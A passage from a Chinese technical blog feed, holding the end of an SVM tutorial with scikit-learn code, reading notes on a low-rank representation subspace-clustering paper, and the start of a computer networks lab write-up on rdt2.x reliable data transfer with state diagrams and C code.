class="number">1</span>)</span><br><span class="line"></span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建SVM模型</span></span><br><span class="line">svm_classic = SVC(kernel=<span class="string">&#x27;linear&#x27;</span>)  <span class="comment"># 经典SVM</span></span><br><span class="line">svm_soft = SVC(kernel=<span class="string">&#x27;linear&#x27;</span>, C=<span class="number">0.1</span>)  <span class="comment"># 软间隔SVM</span></span><br><span class="line">svm_kernel = SVC(kernel=<span class="string">&#x27;rbf&#x27;</span>, gamma=<span class="number">0.001</span>)  <span class="comment"># 带核函数的SVM</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拟合模型</span></span><br><span class="line">svm_classic.fit(X_train, y_train)</span><br><span class="line">svm_soft.fit(X_train, y_train)</span><br><span class="line">svm_kernel.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line">y_test_classic = svm_classic.predict(X_test)</span><br><span class="line">y_test_soft = svm_soft.predict(X_test)</span><br><span class="line">y_test_kernel = svm_kernel.predict(X_test)</span><br><span class="line"></span><br><span class="line">accuracy_classic = accuracy_score(y_test_classic, y_test)</span><br><span class="line">accuracy_soft = accuracy_score(y_test_soft, y_test)</span><br><span class="line">accuracy_kernel = accuracy_score(y_test_kernel, y_test)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;accuracy of classic svm: %.2f\n&quot;</span></span><br><span class="line">      <span class="string">&quot;accuracy of soft svm: %.2f\n&quot;</span></span><br><span class="line">      <span class="string">&quot;accuracy of kernel svm: %.2f\n&quot;</span></span><br><span class="line">      % (accuracy_classic, accuracy_soft, accuracy_kernel))</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\.<span class="title">py</span>\<span class="title">PythonProject</span>\<span class="title">ml2024</span>\<span class="title">svm</span>\<span class="title">mySVM</span>&gt;<span class="title">python</span> <span class="title">svm.py</span></span></span><br><span class="line"><span class="function"><span class="title">accuracy</span> <span class="title">of</span> <span class="title">classic</span> <span class="title">svm</span>: 0.98</span></span><br><span class="line"><span class="function"><span class="title">accuracy</span> <span class="title">of</span> <span class="title">soft</span> <span class="title">svm</span>: 0.99</span></span><br><span class="line"><span class="function"><span class="title">accuracy</span> <span class="title">of</span> <span class="title">kernel</span> <span class="title">svm</span>: 1.00</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> SVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【机器学习论文阅读笔记】Robust Recovery of Subspace Structures by Low-Rank Representation</title>
      <link href="/2024/05/24/%E3%80%90%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91Robust%20Recovery%20of%20Subspace%20Structures%20by%20Low-Rank%20Representation/"/>
      <url>/2024/05/24/%E3%80%90%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%E3%80%91Robust%20Recovery%20of%20Subspace%20Structures%20by%20Low-Rank%20Representation/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于要轮到自己汇报了好崩溃。。盯着论文准备开始做汇报ppt感觉一头乱麻，决定还是写博客理清思路再说吧</p><p>参考资料：</p><p>论文原文：<a href="https://arxiv.org/pdf/1010.2955">arxiv.org/pdf/1010.2955</a></p><p>RPCA参考文章：<a href="https://zhuanlan.zhihu.com/p/692961710">RPCA - 知乎 (zhihu.com)</a></p><p>谱聚类参考文章：<a href="https://www.cnblogs.com/pinard/p/6221564.html">谱聚类（spectral clustering）原理总结 - 刘建平Pinard - 博客园 (cnblogs.com)</a></p><h1 id="一、问题描述"><a href="#一、问题描述" class="headerlink" title="一、问题描述"></a>一、问题描述</h1><p>该篇论文提出了一种名为LRR(Low-Rank Representation)的目标函数，为了解决以下问题：</p><p>给定一组从<strong>多个子空间</strong>的并集中近似抽取的数据样本(向量)，我们的目标是将样本<strong>聚类</strong>到它们各自的子空间中，并<strong>去除可能的异常值</strong>。</p><blockquote><p>Given a set of data samples (vectors) approximately drawn from a union of multiple subspaces, our goal is to cluster the samples into their respective subspaces and remove possible outliers as well.</p></blockquote><p><strong>什么叫数据样本是从多个子空间的并集中近似抽取的？</strong></p><p><img src="/img/2024/05/LRR/0.png" alt="image"></p><p>如图所示，当我们的每个数据点的特征数量为3时，样本空间就是三维的空间</p><p>左边的图就表示<strong>严格地</strong>从一个二维平面中和两条一维的直线上抽取数据点；右边的图则表示<strong>近似地</strong>从相同的这三个子空间中抽取数据点。</p><p><strong>而典型的异常值有以下几种类型：</strong></p><p><img src="/img/2024/05/LRR/1.png" alt="image"></p><p>(a)为噪声，表示数据在子空间周围受到轻微扰动<br>(b)为随机损坏，表示有随机的部分数据被严重损坏<br>(c)为特定的损坏，表示有数据样本的一部分(即数据的列)远离子空间</p><h1 id="二、子空间恢复"><a href="#二、子空间恢复" class="headerlink" title="二、子空间恢复"></a>二、子空间恢复</h1><h2 id="1-低秩表示"><a href="#1-低秩表示" class="headerlink" title="1. 低秩表示"></a>1. 低秩表示</h2><p>首先关注怎么把子空间中的数据从误差中恢复出来</p><p><img src="/img/2024/05/LRR/2.png" alt="image"></p><p>我们把原始的数据矩阵$X$ 表示为两个矩阵的加和：</p><script type="math/tex; mode=display">X = X_0 + E_0</script><p>其中，$X_0$就是恢复后的矩阵，$E_0$就是代表异常值的矩阵</p><p>我们看下这两个矩阵分别有什么特点，举一个比较简单的例子</p><p><img src="/img/2024/05/LRR/3.png" alt="image"></p><p>像左侧这样一个被损坏的数据，我们可以将其分解为一个<strong>低秩</strong>（各列之间相关性较强）的矩阵，还有一个<strong>稀疏</strong>的矩阵</p><p>为了能够完成这一目标，我们定义优化目标如下：</p><script type="math/tex; mode=display">min_{D, E} \space rank(D) + \lambda ||E||_l \quad s.t. \quad X = D + E</script><p>其中，$D$表示恢复后的矩阵，$||E||_l$表示特定的正则化项，$l$由异常的类型决定:</p><p>当异常值为一中提到的</p><p>(a) 噪声: $||E||_l$ 为 $||E||_F$<br>(b) 随机损坏: $||E||_l$ 为 $||E||_0$<br>(c) 特定损坏: $||E||_l$ 为 $||E||_{2,0}$</p><p>其实这上面的公式是被Robust PCA所采用的，而且这个公式隐式地假设了底层的数据是<strong>单一的</strong>低秩子空间的结构</p><p>当我们的数据是从多个子空间的并集$\cup_{i=1}^k S_i$中提取出来的时，使用上述公式，就是把数据当作从一个单一的子空间$S = \sum_{i=1}^k S_i$中采样</p><p>然而，$\sum_{i=1}^k S_i$是比$\cup_{i=1}^k S_i$要大的多的，所以使用上述目标函数会不够精确，不能很好地考虑到单个子空间的细节</p><p>对此，我们使用以下优化目标代替：</p><script type="math/tex; mode=display">min_{Z, E} \space rank(Z) + \lambda ||E||_l \quad s.t. \quad X = AZ + E</script><p>其中，$A$是一个横跨数据空间的“字典”。我们将上述优化目标关于$Z$的解$Z^*$ 称作 $X$在字典$A$中的低最低秩表示(lowest rank representation)</p><blockquote><p>在字典学习中，我们会利用一个字典$A$，得到数据$X$的稀疏表示$\alpha$，从而提取出数据中最本质的特征，用更少的资源表示尽可能多的知识：</p><script type="math/tex; mode=display">X = A \alpha</script></blockquote><p>当$A = I$时，后面的公式就会返回前面的形式。所以LRR可以看作是RPCA泛化的版本，而RPCA使用标准基作为字典</p><h2 id="2-分析LRR问题"><a href="#2-分析LRR问题" class="headerlink" title="2. 分析LRR问题"></a>2. 分析LRR问题</h2><p>由于秩函数的离散性，优化问题难以解决。实际上，在秩最小化的问题中，人们常用 <strong>核范数(一个矩阵的奇异值之和)</strong> 代替：</p><script type="math/tex; mode=display">min_{Z, E} \space ||Z||_*  + \lambda ||E||_l \quad s.t. \quad X = AZ + E</script><p>由于$l_1$范数和$l_{2,1}$范数分别是$l_0$范数和$l_{2,0}$范数的良好松弛，将优化问题写作如下形式：</p><script type="math/tex; mode=display">min_{Z, E} \space ||Z||_*  + \lambda ||E||_{2,1} \quad s.t. \quad X = AZ + E</script><p>将其转化为等价问题如下:</p><script type="math/tex; mode=display">min_{Z, E, J} \space ||J||_*  + \lambda ||E||_{2,1} \quad s.t. \quad X = AZ + E, J = Z</script><blockquote><p>我也不知道为什么要引入一个$J = Z$，多这个变量有什么必要吗</p></blockquote><p>利用增广拉格朗日乘子法(ALM)，优化目标转化为最小化以下拉格朗日函数：</p><script type="math/tex; mode=display">\mathcal{L} = ||J||_*  + \lambda ||E||_{2,1} + tr(Y_1^T (X - AZ - E)) + \\ \qquad tr(Y_2^T ( J - Z)) + \frac{\mu}{2} ( || X - AZ - E ||_F^2 +  || J - Z ||_F^2 )</script><p>算法如下：</p><p><img src="/img/2024/05/LRR/4.png" alt="image"></p><p>其中，求解第一步利用的是某篇引用的方法：Singular Value Thresholding (SVT) operator</p><p>求解第二步过程如下：</p><p>由$\mathcal{L} = ||J||_*  + \lambda ||E||_{2,1} + tr(Y_1^T (X - AZ - E)) + \ \qquad tr(Y_2^T ( J - Z)) + \frac{\mu}{2} ( || X - AZ - E ||_F^2 +  || J - Z ||_F^2 ) $</p><p>令$\frac{\partial \mathcal{L}}{\partial Z} = -A^T Y_1 + Y_2 + \frac{\mu}{2} (-2A^T( X -AZ - E) + 2Z) =0$</p><p>得到</p><script type="math/tex; mode=display">(A^TA + I)Z - A^T(X - E) = \frac{1}{\mu} (A^T Y_1 - Y_2)</script><script type="math/tex; mode=display">Z = (A^TA + I)^{-1} (A^T(X - E) + \frac{1}{\mu} (A^T Y_1 - Y_2))</script><p>求解第三步利用的是以下引理：</p><p><img src="/img/2024/05/LRR/5.png" alt="image"></p><p>当固定其他变量，对$E$进行迭代时，问题如下：</p><script type="math/tex; mode=display">argmin_E \frac{\lambda}{\mu} ||E||_{2,1} + \frac{1}{2}||E - (X - AZ - \frac{Y_1}{\mu})||_F^2</script><h1 id="三、子空间分割"><a href="#三、子空间分割" class="headerlink" title="三、子空间分割"></a>三、子空间分割</h1><p>将$X$作为字典$A$，即$A = X$，上述优化目标可写作：</p><script type="math/tex; mode=display">min_{Z, E} \space ||Z||_*  + \lambda ||E||_{2,1} \quad s.t. \quad X = XZ + E</script><blockquote><p>由于当带有skinny SVD $U_0 \Sigma_0 V_0^T$的$X_0$是严格从多个子空间的并集中提取的数据样本的集合，子空间的隶属度由<strong>行空间</strong>决定，并且子空间相互独立时，有以下结论：</p><p>$V_0 V_0^T$是块对角矩阵，且当且仅当第i个样本和第j个样本来自同一子空间时，$V_0 V_0^T$的$(i, j)$位置的元素非零</p><p>故可以利用$V_0 V_0^T$做子空间分割</p></blockquote><p>我们先获得对上述优化目标的解$(Z^<em>, E^</em>)$，令$Z^<em> = U^</em> \Sigma^<em> (V^</em>)^T$</p><p>相对地，我们使用$U^<em> (U^</em>)^T$从列空间入手做子空间分割，并定义亲和矩阵(affinity matrix)如下：</p><script type="math/tex; mode=display">W_{i, j} = ([\tilde{U}^* (\tilde{U}^*)^T]_{i, j})^2</script><p>其中，$\tilde{U}^<em> = U^</em> (\Sigma^*)^{\frac{1}{2}}$，原文说是为了对损坏数据有更好的性能，保证亲和矩阵的值都是正的（没理解）</p><p>最后再利用谱聚类算法比如NCut(Normalized Cuts)对$W$做切图聚类</p><p>NCut的定义见前言中的参考文章</p><p>整体的算法流程如下：</p><p><img src="/img/2024/05/LRR/6.png" alt="image"></p><p>由于执行NCut算法要先确定子空间数$k$，可以通过计算$W$的拉普拉斯矩阵$L$，由$L$的零奇异值个数得到$k$</p><p>但是实际情况下亲和矩阵只是接近于块对角矩阵，因此论文中还提出了软阈值的方法确定$k$</p><p><img src="/img/2024/05/LRR/7.png" alt="image"></p><p><img src="/img/2024/05/LRR/8.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 聚类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【SZU计算机网络实验】从rdt到GBN，这实验居然实现了TCP的可靠数据传输机制？</title>
      <link href="/2024/05/03/%E3%80%90SZU%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E3%80%91%E4%BB%8Erdt%E5%88%B0GBN%EF%BC%8C%E8%BF%99%E5%AE%9E%E9%AA%8C%E5%B1%85%E7%84%B6%E5%AE%9E%E7%8E%B0%E4%BA%86TCP%E7%9A%84%E5%8F%AF%E9%9D%A0%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%9C%BA%E5%88%B6%EF%BC%9F/"/>
      <url>/2024/05/03/%E3%80%90SZU%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E3%80%91%E4%BB%8Erdt%E5%88%B0GBN%EF%BC%8C%E8%BF%99%E5%AE%9E%E9%AA%8C%E5%B1%85%E7%84%B6%E5%AE%9E%E7%8E%B0%E4%BA%86TCP%E7%9A%84%E5%8F%AF%E9%9D%A0%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%9C%BA%E5%88%B6%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个实验六个任务，实验文档一划划不到底。。看来老师们是真下功夫了啊</p><p>本文主要展示了作者在完成SZU计算机网络实验3的思路及过程，实验主要包括：</p><ol><li>理解rdt2.1</li><li>实现rdt2.2</li><li>实现rdt3.0</li><li>实现回退N步（GBN）机制</li><li>实现面向无连接的可靠传输机制（GBN）</li><li>进行量化分析</li></ol><p>文中出现的状态机演示图均基于mermaid。在本文中，<strong>过渡文字中第一行表示事件，第二行之后表示动作</strong></p><p>参考资料：</p><p>实验文档：<a href="http://course.snrc.site/computer-networks/">计算机网络课程综合实验平台 (snrc.site)</a></p><h1 id="一、理解rdt2-1"><a href="#一、理解rdt2-1" class="headerlink" title="一、理解rdt2.1"></a>一、理解rdt2.1</h1><h2 id="0-理解rdt1-0和rdt2-0"><a href="#0-理解rdt1-0和rdt2-0" class="headerlink" title="0. 理解rdt1.0和rdt2.0"></a>0. 理解rdt1.0和rdt2.0</h2><p>在理解rdt2.1之前，我们需要先了解rdt2.1出现的背景，才能知道其解决的问题</p><p>rdt全称reliable data transfer，即可靠数据传输</p><p>由于网络层是不可靠传输，而位于网络层之上的传输层中的TCP，试图为上层提供可靠的传输</p><h3 id="1-rdt1-0"><a href="#1-rdt1-0" class="headerlink" title="1) rdt1.0"></a>1) rdt1.0</h3><p><strong>rdt1.0</strong>作为第一代的rdt模型，它假设底层信道（网络层及其以下层）是可靠的，即传输层的这一端到另一端之间，它们都是按序到达，且<strong>不会出现数据的损坏和丢包</strong></p><p>因而rdt1.0的发送端和接收端的状态机的表示如下</p><p><strong>发送端</strong><br><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram    direction LR    state &quot;Wait for call from above&quot; as st    [*] --&gt; st    st --&gt; st: rdt_send(data) &lt;br&gt;  packet&#x3D;make_pkt(data) udt_send(packet)  </pre></div></p><p>rdt_send(data)表示上层（应用层）发送数据到该层</p><p>packet=make_pkt(data)表示将数据封装成数据包，udt_send(packet)将数据包传递给下层</p><p><strong>接收端</strong><br><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram    direction LR    state &quot;Wait for call from below&quot; as st    [*] --&gt; st    st --&gt; st: rdt_rcv(packet) &lt;br&gt;  extract(packet, data) deliver_data(data)  </pre></div></p><p>rdt_rcv(packet)表示从下层接收到数据包</p><p>extract(packet, data)表示从数据包中提取出数据，deliver_data(data)将数据分发到上层</p><h3 id="2-rdt2-0"><a href="#2-rdt2-0" class="headerlink" title="2) rdt2.0"></a>2) rdt2.0</h3><p>rdt1.0过于理想，实际上<strong>发送的数据包</strong>很可能在传输过程中，出现<strong>比特差错</strong></p><p>那么接收端就需要对数据包做差错检测。如果数据包没有受损，则反馈给发送端一个ACK；若数据包受损，则反馈给发送端一个NAK</p><p>而发送端在发送数据包后等待接收端的反馈，根据反馈是ACK还是NAK选择进入下一个数据包的发送，或是重传原来的数据包</p><p>rdt2.0的状态机如下：</p><p><strong>发送端</strong><br><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram   state &quot;Wait for call from above&quot; as st1   state &quot;Wait for ACK or NAK&quot; as st2   [*] --&gt; st1   st1 --&gt; st2: rdt_send(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(data, checksum) udt_send(sndpkt)   st2 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; isACK(rcvpkt) &lt;br&gt;     st2 --&gt; st2: rdt_rcv(rcvpkt) &amp;&amp; isNAK(rcvpkt) &lt;br&gt;  udt_send(sndpkt)  </pre></div></p><p>可以发现在构造数据包时，多引入了一个变量checksum即校验码：sndpkt=make_pkt(data, checksum)</p><p><strong>接收端</strong><br><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram   direction LR   state &quot;Wait for call from below&quot; as st   [*] --&gt; st   st --&gt; st: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &lt;br&gt;  extract(packet, data) deliver_data(data) sndpkt&#x3D;make_pkt(ACK) udt_send(sndpkt)   st --&gt; st: rdt_rcv(rcvpkt) &amp;&amp; corrupt(rcvpkt) &lt;br&gt;  sndpkt&#x3D;make_pkt(NAK) udt_send(sndpkt)  </pre></div></p><p>接收到数据包时，利用notcorrupt(rcvpkt)和corrupt(rcvpkt)判断数据包受损与否</p><p>若未受损，构造ACK数据包并反馈：sndpkt=make_pkt(ACK) udt_send(sndpkt)</p><p>若受损，构造NAK数据包并反馈：sndpkt=make_pkt(NAK) udt_send(sndpkt)</p><h2 id="1-引入rdt2-1"><a href="#1-引入rdt2-1" class="headerlink" title="1. 引入rdt2.1"></a>1. 引入rdt2.1</h2><h3 id="1-rdt2-1的状态转移"><a href="#1-rdt2-1的状态转移" class="headerlink" title="1) rdt2.1的状态转移"></a>1) rdt2.1的状态转移</h3><p>在rdt2.0中，通过引入ACK/NAK解决了发送的数据包可能存在比特差错的问题</p><p>但是，接收端反馈的<strong>ACK/NAK数据包</strong>也可能在传输过程中出现<strong>比特差错</strong>，这就需要在接收端构造ACK/NAK数据包时也使用checksum校验码，并且在发送端对ACK/NAK数据包进行校验。</p><p>这就导致了一种情况：当发送的数据包成功抵达接收方，而接收方发送的ACK出现比特差错时，发送方需要重传原来的数据包，而接收方无法识别这是新的数据包还是原来的数据包的重传</p><p>因此需要为每个数据包标号0/1：</p><p>当发送端<strong>发送数据包0</strong>，进入<strong>等待ACK/NAK</strong>的状态；数据包0成功抵达接收端，接收端<strong>发送一个ACK</strong>并进入<strong>等待数据包1</strong>的状态；但是该ACK出现比特差错，发送端需要<strong>重传数据包0，继续等待ACK/NAK</strong>，接收端接收到数据包0，知道是重复的数据包，<strong>返回一个ACK并继续等待数据包1</strong></p><p>故rdt2.1的状态机如下以及：</p><p><strong>发送端</strong></p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram   state &quot;Wait for call 0 from above&quot; as st1   state &quot;Wait for ACK or NAK 0&quot; as st2   state &quot;Wait for call 1 from above&quot; as st3   state &quot;Wait for ACK or NAK 1&quot; as st4   [*] --&gt; st1   st1 --&gt; st2: rdt_send(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(0, data, checksum) udt_send(sndpkt)   st2 --&gt; st2: rdt_rcv(rcvpkt) &amp;&amp; (corrupt(rcvpkt) || isNAK(rcvpkt)) &lt;br&gt; udt_send(sndpkt)   st2 --&gt; st3: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt) &lt;br&gt;     st3 --&gt; st4: rdt_send(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(1, data, checksum) udt_send(sndpkt)   st4 --&gt; st4: rdt_rcv(rcvpkt) &amp;&amp; (corrupt(rcvpkt) || isNAK(rcvpkt))  &lt;br&gt; udt_send(sndpkt)   st4 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt) &lt;br&gt;    </pre></div><p>与rdt2.0相比，rdt2.1在make_pkt中新增了一个参数，值为0/1：</p><p>sndpkt=make_pkt(0, data, checksum)<br>sndpkt=make_pkt(1, data, checksum)</p><p>在等待ACK/NAK的状态中，当<strong>接收包损坏或为NAK</strong>时重发，只有接收包<strong>未损坏且为ACK</strong>时才进入下一数据包的发送：</p><p>corrupt(rcvpkt) || isNAK(rcvpkt)<br>notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt)</p><p><strong>接收端</strong></p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  stateDiagram   direction LR   state &quot;Wait for 0 call from below&quot; as st1   state &quot;Wait for 1 call from below&quot; as st2   [*] --&gt; st1   st1 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; corrupt(rcvpkt) &lt;br&gt; sndpkt&#x3D;make_pkt(NAK, checksum) udt_send(sndpkt)   st1 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; has_seq1(rcvpkt) &lt;br&gt;sndpkt&#x3D;make_pkt(ACK, checksum) udt_send(sndpkt)   st1 --&gt; st2: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; has_seq0(rcvpkt) &lt;br&gt; extract(packet, data) deliver_data(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(ACK, checksum) udt_send(sndpkt)   st2 --&gt; st2: rdt_rcv(rcvpkt) &amp;&amp; corrupt(rcvpkt) &lt;br&gt; sndpkt&#x3D;make_pkt(NAK, checksum) udt_send(sndpkt)   st2 --&gt; st2: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; has_seq0(rcvpkt) &lt;br&gt; sndpkt&#x3D;make_pkt(ACK, checksum) udt_send(sndpkt)   st2 --&gt; st1: rdt_rcv(rcvpkt) &amp;&amp; notcorrupt(rcvpkt) &amp;&amp; has_seq1(rcvpkt) &lt;br&gt; extract(packet, data) deliver_data(data) &lt;br&gt;  sndpkt&#x3D;make_pkt(ACK, checksum) udt_send(sndpkt)  </pre></div><p>与rdt2.0相比，rdt2.1在make_pkt中增加了一个checksum：</p><p>sndpkt=make_pkt(ACK, checksum)<br>sndpkt=make_pkt(NAK, checksum)</p><p>在Wait for 0 call from below状态中，只有接收到<strong>未损坏且序列号为0</strong>的数据包，才会提取并分发数据并发送一个ACK，跳转到Wait for 1 call from below状态；接收到<strong>未损坏且序列号为1</strong>的数据包时，认定其为重复，不提取分发，但是发送一个ACK；接收到<strong>损坏</strong>的数据包时，发送一个NAK</p><h3 id="2-rdt2-1的代码实例"><a href="#2-rdt2-1的代码实例" class="headerlink" title="2) rdt2.1的代码实例"></a>2) rdt2.1的代码实例</h3><p>在c语言中利用一个while循环+switch分支模拟状态机的运行，代码如下：</p><p><strong>发送端</strong></p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">void</span> <span class="title function_">sending_packets</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 初始化状态</span></span><br><span class="line">    Sender_State currentState = STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> seq = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">    Packet *rcvpkt;</span><br><span class="line">    boolean finish_send = FALSE;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// get start_time</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_time = GetTickCount();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!finish_send)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (currentState)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE\n&quot;</span>);</span><br><span class="line">            data = rdt_send(seq);</span><br><span class="line">            sndpkt = make_pkt(seq, PACKET_TYPE_DATA, data);</span><br><span class="line">            udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">            seq++;</span><br><span class="line">            </span><br><span class="line">            currentState = STATE_WAIT_ACK_NAK_EVEN;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> STATE_WAIT_ACK_NAK_EVEN:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_ACK_NAK_EVEN\n&quot;</span>);</span><br><span class="line">            rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (corrupt(rcvpkt) || isNAK(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">free</span>(sndpkt);</span><br><span class="line">                currentState = STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(rcvpkt);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_FOR_CALL_ODD_FROM_ABOVE\n&quot;</span>);</span><br><span class="line">            data = rdt_send(seq);</span><br><span class="line">            sndpkt = make_pkt(seq, PACKET_TYPE_DATA, data);</span><br><span class="line">            udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">            seq++;</span><br><span class="line">            </span><br><span class="line">            currentState = STATE_WAIT_ACK_NAK_ODD;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> STATE_WAIT_ACK_NAK_ODD:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;STATE_WAIT_ACK_NAK_ODD\n&quot;</span>);</span><br><span class="line">            rcvpkt = rdt_rcv(sockfd, &amp;client_addr);</span><br><span class="line">            <span class="keyword">if</span> (corrupt(rcvpkt) || isNAK(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                udt_send(sockfd, sndpkt, &amp;client_addr);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (notcorrupt(rcvpkt) &amp;&amp; isACK(rcvpkt))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">free</span>(sndpkt);</span><br><span class="line">                currentState = STATE_WAIT_FOR_CALL_EVEN_FROM_ABOVE;</span><br><span class="line">                <span class="keyword">if</span> (seq == TOTAL_PACKETS)</span><br><span class="line">                    finish_send = TRUE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(rcvpkt);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>接收端</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 